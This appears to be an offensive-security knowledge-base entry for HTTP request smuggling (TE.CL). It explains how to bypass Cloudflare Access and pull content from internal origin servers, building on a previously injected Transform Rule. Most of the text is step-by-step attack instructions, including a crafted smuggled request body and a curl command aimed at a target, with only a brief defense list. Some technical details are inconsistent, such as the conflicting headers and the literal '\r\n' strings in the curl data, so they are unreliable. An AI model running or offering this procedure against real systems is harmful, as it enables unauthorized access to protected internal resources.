---
tags:
  - http-request-smuggling
  - cloudflare
  - te.cl
  - internal-access
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands: []
platforms:
  - Web
  - Cloud (Cloudflare)
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 6e7c258b-2087-4fe2-a5df-3fac1741936c
created_at: '2025-12-14T17:28:36.458Z'
updated_at: '2025-12-14T17:28:36.458Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Smuggle-Internal-Request-via-Chunked-Transfer-Encoding

## Summary

This procedure sends a POST request with a chunked body that smuggles a GET request to an internal host, exploiting the previously injected Transfer-Encoding header to bypass Cloudflare Access and retrieve content from protected origin servers.

## Description

Building on the header injection, this procedure crafts a POST request where the body is interpreted as chunked due to the forged 'Transfer-Encoding: chunked' header. The body contains a complete HTTP GET request (e.g., to an internal hostname like internal.example.com), which Cloudflare's backend processes as a separate request after misinterpreting the outer POST. This achieves TE.CL (Transfer-Encoding / Content-Length) smuggling, allowing access to internal resources without authentication. It targets Cloudflare-proxied applications with internal backends and requires the prior rule injection to be active.

## Requirements

1. Active Transform Rule from the injection procedure
2. Knowledge of internal hostnames (e.g., via prior recon)
3. HTTP client capable of sending raw requests with custom bodies (e.g., curl or Burp Suite)

## Defense

Defensive measures and detection strategies:

- Normalize and validate Transfer-Encoding headers at the edge to prevent dual interpretations
- Use Cloudflare's Request Smuggling protection features or custom WAF rules to block chunked smuggling attempts
- Log and alert on requests with mismatched Content-Length and chunked bodies, or anomalous internal host references

## Objectives

1. Smuggle an internal GET request within a chunked POST body
2. Bypass Cloudflare Access to view protected internal content
3. Demonstrate full request smuggling impact on origin servers

## Instructions

### Step 1: Craft the Smuggled Request Body

**Context**: Prepare the POST body as a zero-length chunk followed by the internal GET request.

Construct the body as:

```http
0\r\n\r\nGET / HTTP/1.1\r\nHost: internal.example.com\r\n\r\n
```

> The '0\r\n\r\n' signals the end of the outer POST chunk, allowing the backend to parse the subsequent GET as a new request.

### Step 2: Send the POST Request to the Target Endpoint

**Context**: Transmit the request with the injected header active, using chunked encoding.

Use curl to send the request:

```bash
curl -v -X POST \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 0" \
  --data '0\r\n\r\nGET / HTTP/1.1\r\nHost: internal.example.com\r\n\r\n' \
  https://target.cloudflare.com/
```

> Note: The actual Transfer-Encoding is injected by the rule; the client sends with Content-Length: 0 to trigger TE.CL mismatch. Replace 'internal.example.com' with the target internal host.

### Step 3: Validate Smuggling Success

**Context**: Check the response for internal content.

Inspect the curl verbose output or response body for the GET response (e.g., 200 OK from internal server).

> Success is indicated by internal page content appearing in the response, confirming bypass of security controls.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[http-request-smuggling]]
- [[cloudflare]]
- [[te.cl]]
- [[internal-access]]
